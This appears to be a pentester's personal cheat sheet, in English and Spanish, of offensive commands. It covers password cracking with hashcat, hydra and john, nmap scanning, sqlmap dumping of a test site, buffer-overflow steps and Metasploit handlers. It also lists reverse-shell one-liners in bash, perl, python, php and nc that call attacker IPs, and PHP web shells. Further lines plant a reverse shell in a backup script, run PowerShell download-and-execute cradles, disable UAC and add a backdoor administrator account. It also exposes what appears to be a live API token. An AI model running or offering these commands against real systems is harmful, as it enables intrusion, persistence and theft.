## Cracking
hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
  -m 0 designates the type of hash we are cracking (MD5);
  -a 0 designates a dictionary attack;
  -o cracked.txt is the output file for the cracked passwords;
  -target_hashes.txt is our input file of hashes;
  -/usr/share/wordlists/rockyou.txt = Path to the wordlist
 
 m - 0:MD5
     100:SHA1
     1400:SHA256
     1700:SHA512
     900:MD4
     3200:BCRYPT
hashcat -m 1000 -a 3 -w 3 -O 6d3448b44472bc42b065e6fcd94d7922 $rockyou 

hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.123.101 ftp
hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.123.101 -t 4 ssh
hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=incorrect" -V

john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
zip2john file.zip > crack.txt
john crack.txt --wordlist=rockyou.txt --format=Raw-SHA256

## Scaning

nmap -sV -sC -oA nmap.txt 10.10.10.x
nmap -sC -sV -v -oN nmap.txt 10.10.10.x
nmap -sS -P0 -A -v 10.10.10.x
masscan -e tun0 -pi-65535 --rate=1000
nmap -sU -sV -A -T4 -v -oN udp.txt 10.10.10.x
nmap -v -sS -f -mtu 32 --send-eth --data-length 50 --source-port 8965 -T5 192.168.0.22
while IFS= read -r line; do nmap -A -p80,443 $line -oG $line.txt -v -n -T4 --open; done < hosts.txt

for ip in $(cat smb_ips.txt); do nbtscan $ip; done

minimal port scanning

#!/bin/bash
host=10.5.5.11
for port in {1..65535}; do
timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
echo "port $port is open"
done
echo "Done"

For linea por linea

for i in *; do echo $i; donecd 

## SQLi
URL = http://testphp.vulnweb.com/artists.php?artist=1

Find DBs = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch

Result is DB name acuart

Find Tables = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch

Result is table name users

Find columns = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch

Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch

Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch

sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch

OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell

## Wireshark

To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
To find passwords : http.request.method == POST

## Buffer Overflow

!mona find -s '\xff\xe4' -m ASX2MP3Converter.exe

!mona seh -m "$module"

BadChars

!mona config -set workingfolder c:\logs\%p

!mona pattern_create 200

!mona pattern_offset XXXXXX

!mona bytearray

!mona compare -f C:\logs\program\bytearray.bin -a 00149DA8

00149DA8 > Direccion donde empieza badchars

## Metasploit

msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD windows/shell/reverse_tcp;\
set LHOST 192.168.19.24;\
set LPORT 443;\
run"

msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD linux/x86/shell_reverse_tcp;\
set LHOST 10.11.15.17;\
set LPORT 443;\
run"

## Reverse Shell

bash -i >& /dev/tcp/192.168.119.141/443 0>&1

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

nc -e /bin/sh 10.0.0.1 1234
---
WebShell

<?php
system($_REQUEST['cmd'])
?>

php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=screen-256color
[Ctrl Z]
stty raw -echo
fg
reset
xterm

stty -a para ver número de filas y columnas 
seteamos el mismo numero en la máquina víctima

Error opening terminal: unknown.
stty rows 48 columns 165


#Funtions

autogobuster () {
echo "\n [*] Ejecutando gobuster dir -u $1 -w $wordlist -k -t 100 $2 \n"
gobuster -u $1 -w $wordlist -k -t 50 -o out_$(echo $1 | cut -f 2 -d '.')_web.txt $2 
}

autowpscan () {
wpscan --disable-tls-checks  -e u,ap,at,cb,dbe --url $1 --api-token hshBqrQ1A5cmgjT4e3jSljEnn5wMeDCcagLj6yeCO3M -o $(echo $1 | cut -f 3 -d "/").txt
}
autodalfox () {
nohup dalfox -b https://vsh00t.xss.ht file /home/jorge/Cyber-pix/output/$1 --custom-payload /opt/payloads/xss.txt --waf-evasion -w 1000 -o /home/jorge/Cyber-pix/xss-result/$1 &
}

## windows y AD

Deshabilitar UAC

cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

Pasar Archivos

impacket-smbserver nombre $(pwd)

copy archivo \\10.10.14.28\nombre\archivo

Copiar archivo desde web

start /b powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/PS.ps1')

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"

certutil.exe -f -urlcache -split http://10.10.14.28/41020.exe 41020.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.28/41020.exe', 'C:\Temp\41020.exe')"

PowerShell.exe -ExecutionPolicy UnRestricted -File file.ps1

powershell -c "Invoke-WebRequest -Uri 'http://10.8.50.72:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

net user vsh00t password123 /add
net localgroup Administrators vsh00t /add

Encode Powershell

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX ((new-object net.webclient).downloadstring('http://10.8.0."))

